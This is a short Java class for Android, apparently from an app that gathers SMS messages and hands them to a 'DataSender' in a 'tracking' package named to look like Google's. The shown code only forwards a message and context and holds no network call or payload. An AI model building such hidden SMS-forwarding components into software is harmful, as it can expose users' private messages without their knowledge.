package com.google.tracking.sms;

import android.content.Context;
import com.google.tracking.sender.DataSender;

public class SmsAggregator {
    public SmsAggregator(String msg, Context context){
        DataSender sender = new DataSender(msg, context);
    }
}
